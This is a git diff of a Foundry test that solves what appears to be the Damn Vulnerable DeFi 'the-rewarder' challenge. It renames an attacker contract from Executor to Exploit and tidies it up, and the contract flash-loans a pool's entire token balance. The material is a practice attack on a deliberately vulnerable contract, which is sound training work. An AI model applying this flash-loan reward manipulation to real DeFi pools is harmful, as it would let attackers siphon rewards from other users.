@@ -12,12 +12,12 @@ import {RewardToken} from "../../../Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../Contracts/the-rewarder/FlashLoanerPool.sol";
 
-contract Executor is DSTest {
-    TheRewarderPool rewarder;
-    FlashLoanerPool private flashLoaner;
-    DamnValuableToken private dvt;
-    RewardToken private rwt;
-    address private owner;
+contract Exploit is DSTest {
+    TheRewarderPool private immutable rewarder;
+    FlashLoanerPool private immutable flashLoaner;
+    DamnValuableToken private immutable dvt;
+    RewardToken private immutable rwt;
+    address private immutable owner;
 
     constructor(TheRewarderPool _rewarder, FlashLoanerPool _flashLoaner) {
         owner = msg.sender;
@@ -27,7 +27,7 @@ contract Executor is DSTest {
         rwt = _rewarder.rewardToken();
     }
 
-    function borrow() external {
+    function run() external {
         require(msg.sender == owner, "Not an owner");
         uint256 poolBalance = dvt.balanceOf(address(flashLoaner));
         flashLoaner.flashLoan(poolBalance);
@@ -127,8 +127,9 @@ contract TheRewarder is DSTest {
         // wait for the next round
         vm.warp(block.timestamp + 5 days);
         vm.startPrank(attacker);
-        Executor executor = new Executor(theRewarderPool, flashLoanerPool);
-        executor.borrow();
+        Exploit expl = new Exploit(theRewarderPool, flashLoanerPool);
+        vm.label(address(expl), "Exploit");
+        expl.run();
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
